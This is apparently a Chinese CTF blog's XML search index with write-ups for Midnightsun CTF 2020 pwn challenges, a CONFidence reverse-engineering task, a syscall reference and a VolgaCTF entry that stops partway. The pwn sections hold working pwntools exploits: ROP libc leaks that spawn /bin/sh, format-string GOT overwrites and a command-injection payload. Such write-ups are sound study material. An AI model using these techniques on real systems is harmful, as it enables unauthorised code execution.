<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Midnightsun CTF 2020</title>
    <url>/2020/04/05/Midnightsun-CTF-2020/</url>
    <content><![CDATA[<p>只会做简单的，re没去做，做pwn去了。</p>
<a id="more"></a>

<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset = <span class="number">0x48</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400783</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000400781</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">main = <span class="number">0x0000000000400698</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_offset = libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"buffer: "</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * offset</span><br><span class="line">payload += flat([pop_rdi, puts_got, puts_plt, main])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_puts = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = libc_puts - puts_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * offset</span><br><span class="line">payload += flat([pop_rsi, <span class="number">0</span>, <span class="number">0</span>, pop_rdi, str_bin_sh, libc_system])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><code>midnight{the_pwnshank_redemption_d2b4205bea4b8eeb}</code></p>
<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_str</span><span class="params">(offset, addr_value_pairs, size, info=<span class="string">""</span>)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> addr_value_pairs:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">            payload += p32(item[<span class="number">0</span>] + i)</span><br><span class="line">    </span><br><span class="line">    length = len(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> addr_value_pairs:</span><br><span class="line">        temp = item[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">            value = ((temp &amp; <span class="number">0xFF</span>) + <span class="number">0x100</span> - length) &amp; <span class="number">0xFF</span></span><br><span class="line">            <span class="keyword">if</span> value == <span class="number">0</span>:</span><br><span class="line">                value = <span class="number">0x100</span></span><br><span class="line">            payload += <span class="string">"%"</span> + str(value) + <span class="string">"c%"</span> + str(offset) + <span class="string">"$hhn"</span></span><br><span class="line">            length = temp &amp; <span class="number">0xFF</span></span><br><span class="line">            temp &gt;&gt;= <span class="number">8</span></span><br><span class="line">            offset += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    payload += info</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">7</span></span><br><span class="line">_exit = elf.got[<span class="string">"exit"</span>]</span><br><span class="line">target_addr = <span class="number">0x08048672</span></span><br><span class="line">printf_got = elf.got[<span class="string">"printf"</span>]</span><br><span class="line">main = <span class="number">0x080485EB</span></span><br><span class="line">__libc_start_main_ret_offset = libc.symbols[<span class="string">"__libc_start_main"</span>] + <span class="number">241</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload = format_str(offset, [[_exit, main]], <span class="number">2</span>, <span class="string">"addr:%27$p"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:0x"</span>)</span><br><span class="line">__libc_start_main_ret = int(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = __libc_start_main_ret - __libc_start_main_ret_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">payload = format_str(offset, [[printf_got, libc_system]], <span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">p.sendlineafter(<span class="string">"input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><code>midnight{the_pwnfather_0ff771d2eccc36b8}</code></p>
<h1 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h1><p>没做出来，知识盲区：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%2$*25$d%16$n"</span>);</span><br></pre></td></tr></table></figure>
<p>输出第25个参数，并根据第2个参数宽度对齐。<br><br>没尝试打远程了，输出太长了，反正比赛结束了，直接打本地了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn4"</span>)</span><br><span class="line">gdb.attach(p, <span class="string">"b fprintf"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%2$*25$d%16$n"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"5536"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="admpanel"><a href="#admpanel" class="headerlink" title="admpanel"></a>admpanel</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span><span class="params">(name, passwd)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" &gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"  Input username: "</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">"  Input password: "</span>, passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(comm)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" &gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"  Command to execute: "</span>, comm)</span><br><span class="line"></span><br><span class="line">auth(<span class="string">"admin\n"</span>, <span class="string">"password\n"</span>)</span><br><span class="line">execute(<span class="string">"id;/bin/sh\x00\n"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><code>midnight{n3v3r_4sk_b0bb_to_d0_S0m3TH4Ng}</code></p>
<h1 id="admpanel2"><a href="#admpanel2" class="headerlink" title="admpanel2"></a>admpanel2</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span><span class="params">(name, passwd)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" &gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"  Input username: "</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">"  Input password: "</span>, passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(comm)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" &gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"  Command to execute: "</span>, comm)</span><br><span class="line"></span><br><span class="line">target_addr = <span class="number">0x0000000000401598</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">"admin;/bin/sh;"</span>.ljust(<span class="number">0x3FE</span>, <span class="string">"A"</span>) + <span class="string">'\n'</span></span><br><span class="line">auth(name, <span class="string">"password\n"</span>)</span><br><span class="line"></span><br><span class="line">comm = <span class="string">"B"</span> * <span class="number">0x10c</span> + p64(target_addr) + <span class="string">"\n"</span></span><br><span class="line">execute(comm)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag: midnight&#123;n3ver_4sk_hsp3_t0_do_s0m3th1ng&#125;</span></span><br></pre></td></tr></table></figure>
<p><code>midnight{n3ver_4sk_hsp3_t0_do_s0m3th1ng}</code></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="http://blog.redrocket.club/2018/06/21/midnightsunctf-finals-2018-glitch/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">http://blog.redrocket.club/2018/06/21/midnightsunctf-finals-2018-glitch/?tdsourcetag=s_pctim_aiomsg</a></li>
</ol>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>CONFidence CTF re: Locked PE</title>
    <url>/2020/03/18/CONFidence-CTF-re-Locked-PE/</url>
    <content><![CDATA[<p>记录一下上周末跟着队里打的CONFidence CTF，只做了一个re，水平有限，花了蛮长时间的。</p>
<a id="more"></a>

<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>x64的exe文件，直接运行没有回显，后台挂有图标，点击没有界面反应，得不到什么信息。<br><br>后来发现是AutoIt转的exe，以前没有听说过，貌似是某种自动化脚本，当然这些不重要，重要的是怎么从exe反编译回AutoIt脚本，拖到IDA根本看不出东西来。</p>
<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>先利用脚本将64位的exe转化为32位，我试图直接用Exe2Aut转成AutoIt脚本语言，转化过程中报错（其实也就是运行时报错）。我还尝试了各种各样的工具，都没能直接转化成功。<br><br>既然原64位程序可以跑，但是转成32位之后就出问题了，说明这个binary肯定哪个地方要patch以下，而且它报的错是”Unable to open the script file”，那我就根据这个来找到底在哪里没有满足条件而出错。<br><br>我先是动态调试，把反调的函数patch掉，跟踪找到32位程序弹窗报错的执行流：<br><img src="/2020/03/18/CONFidence-CTF-re-Locked-PE/check.png" alt="check"><br>在这里调用sub_4128CF之后会对返回值进行一个check，如果返回1的话，或跳转到LABEL_3执行，而这个LABEL_3：<br><img src="/2020/03/18/CONFidence-CTF-re-Locked-PE/label3.png" alt="label3"><br>会调用sub_40B506之后直接返回，之后这个程序就逐步地推出了。这个sub_40B506实际上正是完成弹出”Unable to open the script file”窗口的操作：<br><img src="/2020/03/18/CONFidence-CTF-re-Locked-PE/error.png" alt="error"><br>那么显然sub_4128CF函数部分就是我们需要分析的重点:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __userpurge sub_4128CF@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">void</span> *a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi@1</span></span><br><span class="line">  __int32 v4; <span class="comment">// ST38_4@1</span></span><br><span class="line">  FILE *v5; <span class="comment">// ST34_4@1</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// edi@4</span></span><br><span class="line">  FILE *v8; <span class="comment">// ST0C_4@4</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ebx@4</span></span><br><span class="line">  <span class="keyword">void</span> *v10; <span class="comment">// eax@4</span></span><br><span class="line">  FILE *v11; <span class="comment">// ST3C_4@4</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">void</span> *v13; <span class="comment">// esi@4</span></span><br><span class="line">  <span class="keyword">wchar_t</span> v15; <span class="comment">// [sp+10h] [bp-688h]@1</span></span><br><span class="line">  <span class="keyword">void</span> *v16; <span class="comment">// [sp+220h] [bp-478h]@7</span></span><br><span class="line">  <span class="keyword">void</span> *v17; <span class="comment">// [sp+224h] [bp-474h]@7</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [sp+234h] [bp-464h]@7</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [sp+238h] [bp-460h]@7</span></span><br><span class="line">  <span class="keyword">void</span> *v20; <span class="comment">// [sp+688h] [bp-10h]@4</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [sp+68Ch] [bp-Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [sp+690h] [bp-8h]@4</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [sp+697h] [bp-1h]@4</span></span><br><span class="line">  <span class="keyword">void</span> *v24; <span class="comment">// [sp+6A4h] [bp+Ch]@4</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  sub_41143A();</span><br><span class="line">  v4 = *(_DWORD *)(v3 + <span class="number">4</span>);</span><br><span class="line">  v5 = *(FILE **)v3;</span><br><span class="line">  v21 = <span class="number">1</span>;</span><br><span class="line">  fseek(v5, v4, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_412A3F(<span class="string">L"&gt;&gt;&gt;AUTOIT SCRIPT&lt;&lt;&lt;"</span>, &amp;v15) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">  fread(&amp;v23, <span class="number">1u</span>, <span class="number">1u</span>, *(FILE **)v3);</span><br><span class="line">  fread(&amp;v22, <span class="number">4u</span>, <span class="number">1u</span>, *(FILE **)v3);</span><br><span class="line">  v7 = v22 ^ <span class="number">0x87BC</span>;</span><br><span class="line">  fread(&amp;v22, <span class="number">4u</span>, <span class="number">1u</span>, *(FILE **)v3);</span><br><span class="line">  v8 = *(FILE **)v3;</span><br><span class="line">  *(_DWORD *)a3 = v22 ^ <span class="number">0x87BC</span>;</span><br><span class="line">  fread(&amp;v22, <span class="number">4u</span>, <span class="number">1u</span>, v8);</span><br><span class="line">  v9 = v22 ^ <span class="number">0xA685</span>;</span><br><span class="line">  fseek(*(FILE **)v3, <span class="number">16</span>, <span class="number">1</span>);</span><br><span class="line">  v24 = <span class="built_in">malloc</span>(*(_DWORD *)a3);</span><br><span class="line">  v10 = <span class="built_in">malloc</span>(v7);</span><br><span class="line">  v11 = *(FILE **)v3;</span><br><span class="line">  v20 = v10;</span><br><span class="line">  fread(v10, v7, <span class="number">1u</span>, v11);</span><br><span class="line">  v12 = *(_DWORD *)(v3 + <span class="number">8</span>);</span><br><span class="line">  v13 = v20;</span><br><span class="line">  sub_412597(v20, v7, v12 + <span class="number">9335</span>);</span><br><span class="line">  sub_4113E6(v13, v7);</span><br><span class="line">  <span class="keyword">if</span> ( v9 != v21 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(v24);</span><br><span class="line">    <span class="built_in">free</span>(v13);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v23 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_41143A();</span><br><span class="line">    v18 = <span class="number">1</span>;</span><br><span class="line">    v19 = <span class="number">1</span>;</span><br><span class="line">    v16 = v24;</span><br><span class="line">    v17 = v13;</span><br><span class="line">    sub_411468();</span><br><span class="line">    <span class="built_in">free</span>(v13);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(v24);</span><br><span class="line">    v24 = v13;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)a2 = v24;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上原64位程序函数名全是sub_xxxxxx，转成32位还识别出一些文件操作，这里可以看出，是从原binary中取出了一些bytes进行一些计算然后比较，我开始认为可能是转化成32位程序之后，这些bytes可能读错了位置，导致判断错误，事实上比对之后并没有出错，那是为什么？<br><br>后来我拿32位程序和64位动态跟踪比对，发现分歧就出现在这里：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v9 != v21 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(v24);</span><br><span class="line">  <span class="built_in">free</span>(v13);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>原64位程序这里<code>v9 == v21</code>，而在32位程序执行过程中<code>v9 != v21</code>，并且<code>v9</code>的值相同而<code>v21</code>的值不同。<br><br>那么看看这个v21怎么来的，从动态分析的结果看，在执行到这里之前：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_412597(v20, v7, v12 + <span class="number">9335</span>);</span><br></pre></td></tr></table></figure>
<p>其他参数都保持一致，而执行之后，就造成<code>v9 != v21</code>，对比一下果然：<br><img src="/2020/03/18/CONFidence-CTF-re-Locked-PE/value.png" alt="value"><br>这个值在64位程序里是0xBEEF，在32位程序里却是0x2477(9335)，patch一下改成0xBEEF之后，重新运行，原来的错误没有了（但是报了其他错，实质上没有影响后面反编译的结果)。<br><br>这个时候用Exe2Aut转化一下，成功了:<br><img src="/2020/03/18/CONFidence-CTF-re-Locked-PE/autoit.png" alt="autoit"><br>这里只是脚本最后的部分，但实际上也就是这部分有价值，前面都是一些函数定义。<br><br>分析这个AutoIt脚本，实质上就是对一串给定的16进制值，进行异或操作得到的512bytes分成16组，每组32bytes也就是256bits。然后将<code>ClipGet()</code>得到的数据进行<code>_crypt_hashdata</code>然后和前面提到的16组数据进行比较。<br><br>很容易猜测这个16组256bits的数据其实就是md5散列，随便拿个查一下明文，正好是3个字符的md5散列值，之后就可以写个脚本自己逐个爆破了:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table_1 = [ord(item) <span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">"oOoOooOO"</span>]</span><br><span class="line"></span><br><span class="line">raw = <span class="string">"097e0b7609097f78582b5b7f5f582c780d775c7a0e5a7a78587a5e7a095b7a2e5b7c0c7d0b09297c0c765a295d0b2e790b7f587b58097f2a572c572b090b7b7c0e78572c5b572e7d5e7f5e7d5e5a792958760b7c590d7b7f0d2c5d7b585d78770a7b5e2c5c5a777c5f7e5e7b5d0c2b2a562e0b780b0d7b7d5b775a2c560a7b2e5c7f0b2d575f767d5b2a582e570a2e7d0929577c5b58787e0b7d582e56097e785b2a582a0e0e78790c2e59780a0b2d7d097e577b0d0b2b7e5e295f2e5a097e2e0b2b097b5a0a7b2e5b7f0e29560d767b0b2e0c7a565b297b0a7e5d7f095c76795d2a0e7e5a0e2a29097c572c575a7f7d5e7a0c295f0a2d7b0e2d0a7e0b0c7b2a5a29592c0a0b7e76587d5b77560e7c2a5e775e775e097a2b09295d7c5e092d780b7b5f78090c7d775d7c5f2958097a760d2d0e2c5d562a2b577e577a565c2e7c5f765d775b5c7d2d0c2e0e2a5f592a2a0c7d0d7c0b0b7d7c5a77582a5a59767a0e79562b5e092d2d5d785a7b0e097c7a0d79092c0a0c2b79097f097f57572e295b7b5a7a585f787c0a7c5e2a5b0b2d2b0d7b5b2d5d587c7b5e2e592a5d5c7b290d2e5f79590d7a7b0c7f0e7d575c7d79597f5b79595c772c587b5c7e0b0b7a7e5f2d5a78575b2b2d597b0a780d0e7e795d7b0976585a7a7e567c57785d562a2d0d2b0c290e577e2c587f0e775f0e2e7b09795a2d5c58292c5f765f7f58092978"</span></span><br><span class="line">raw_int = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(raw), <span class="number">2</span>):</span><br><span class="line">    raw_int.append(int(raw[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">string = <span class="string">""</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> raw_int:</span><br><span class="line">    string += chr(item ^ table_1[i % len(table_1)])</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="comment"># print(string)</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">"f1d9ff077d4007c7b835a5577515f45a43c2dff3c95f2da6d0747f0e8c8dfd43a78c48a21012156f79d36b40bc247278e41c358301142cde9ad7db42485c9e4a30db80924e7a8ea2ff834771d27a9f174e7eaa76ca67edb2f184bdd11f0a5f1addf45e4a40af9b94dac594f4e120f3962ea15aeff38c850215cf0eb4abe1dc4e5f6ced1972489a3e18181f5dff231fb7d407fc28230f7f59bbac29ed818593a30928432bcaae06eec2b3dd23587e5695a69d1fbb2754af35b6fcecd6f0f088af44557073e31e4dbdb44b27341a6e234fba066b54c0a283266046638c7431dd510b5784db64e7ba1624f97551938729ebbdcfa81c70a80aa4f65b37fc09007ff7"</span></span><br><span class="line">md5_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(cipher), <span class="number">32</span>):</span><br><span class="line">    md5_list.append(cipher[i:i+<span class="number">32</span>])</span><br><span class="line"><span class="comment"># print(md5_list)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">table = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">    table += chr(i)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> md5_list:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> permutations(table, <span class="number">3</span>):</span><br><span class="line">        target = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">            target += ch</span><br><span class="line">        m = md5()</span><br><span class="line">        m.update(target.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="keyword">if</span> m.hexdigest() == item:</span><br><span class="line">            flag += target</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>这样就拿到flag了。</p>
<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p><img src="/2020/03/18/CONFidence-CTF-re-Locked-PE/getflag.png" alt="getflag"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.cnblogs.com/DeeLMind/p/7147024.html" target="_blank" rel="noopener">https://www.cnblogs.com/DeeLMind/p/7147024.html</a></li>
</ol>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>linux x86 和 x86_64 系统调用表</title>
    <url>/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/</url>
    <content><![CDATA[<p>系统调用号跟传参记不住，索性记录一下。</p>
<a id="more"></a>

<h1 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h1><p><a href="https://syscalls32.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls32.paolostivanin.com/</a></p>
<h1 id="x86-64"><a href="#x86-64" class="headerlink" title="x86_64"></a>x86_64</h1><p><a href="https://syscalls64.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls64.paolostivanin.com/</a><br><br><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></p>
]]></content>
      <categories>
        <category>Reference</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>VolgaCTF 2020</title>
    <url>/2020/03/31/VolgaCTF-2020/</url>
    <content><![CDATA[<p>做了两题溜了，pwn倒是挺简单，被f-hash搞得心态崩了，主要是搞出来的flag错了，找不到问题。结果看人家的wp，wtf，脚本是对的，flag就一个字母不对？？？</p>
<a id="more"></a>

<h1 id="notepad-300pts"><a href="#notepad-300pts" class="headerlink" title="notepad--: 300pts"></a>notepad--: 300pts</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>保护全开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>两类操作，一个是对notebook操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[p]ick    notebook</span><br><span class="line">[a]dd     notebook</span><br><span class="line">[d]elete  notebook</span><br><span class="line">[l]ist    notebook</span><br><span class="line">[q]uit</span><br></pre></td></tr></table></figure>
<p>一个是在<code>pick notebook</code>之后，对notebook的tabs进行操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[a]dd     tab</span><br><span class="line">[v]iew    tab</span><br><span class="line">[u]pdate  tab</span><br><span class="line">[d]elete  tab</span><br><span class="line">[l]ist    tabs</span><br><span class="line">[q]uit</span><br></pre></td></tr></table></figure>
<p>notebook最多16个，每个notebook的空间2072bytes，分配在bss上，包含16bytes的name，8bytes的tabs个数，64个tabs的空间，每个tab占32bytes：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(.bss)</span><br><span class="line">notebook_1 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; +--------+--------+ </span><br><span class="line">             notebook_1.name &lt;--|--      |      --|--&gt; notebook_1.name</span><br><span class="line">                                +--------+--------+</span><br><span class="line">        notebook_1.tab_count &lt;--|--      |      --|--&gt; tab_1.name</span><br><span class="line">                                +--------+--------+</span><br><span class="line">                  tab_1.name &lt;--|--      |      --|--&gt; tab_1.content_size</span><br><span class="line">                                +--------+--------+</span><br><span class="line">          tab_1.content_addr &lt;--|--      |      --|--&gt; tab_2.name</span><br><span class="line">                                +--------+--------+</span><br><span class="line">                  tab_2.name &lt;--|--      |      --|--&gt; tab_2.content_size</span><br><span class="line">                                +--------+--------+</span><br><span class="line">          tab_2.content_addr &lt;--|--      |      --|--&gt; tab_3.name</span><br><span class="line">                                +--------+--------+</span><br><span class="line">                                ...................</span><br><span class="line">                                +--------+--------+</span><br><span class="line">         tab_63.content_addr &lt;--|--      |      --|--&gt; tab_64.name</span><br><span class="line">                                +--------+--------+</span><br><span class="line">                 tab_64.name &lt;--|--      |      --|--&gt; tab_64.content_size</span><br><span class="line">                                +--------+--------+ &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; notebook_2</span><br><span class="line">         tab_64.content_addr &lt;--|--      |      --|--&gt; notebook_2.name</span><br><span class="line">                                +--------+--------+</span><br><span class="line">             notebook_2.name &lt;--|--      |      --|--&gt; notebook_2.tab_count</span><br><span class="line">                                +--------+--------+</span><br><span class="line">                  tab_1.name &lt;--|--      |      --|--&gt; tab_1.name</span><br><span class="line">                                +--------+--------+</span><br><span class="line">          tab_1.content_size &lt;--|--      |      --|--&gt; tab_1.content_addr</span><br><span class="line">                                +--------+--------+</span><br><span class="line">                  tab_2.name &lt;--|--      |      --|--&gt; tab_2.name</span><br><span class="line">                                +--------+--------+</span><br><span class="line">          tab_2.content_size &lt;--|--      |      --|--&gt; tab_2.content_addr</span><br><span class="line">                                +--------+--------+</span><br><span class="line">                                ...................</span><br></pre></td></tr></table></figure>

<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h2 id="leak-heap-address"><a href="#leak-heap-address" class="headerlink" title="# leak heap address"></a># leak heap address</h2><p><code>add notebook</code>中，输入notebook name的时候没有限制长度：</p>
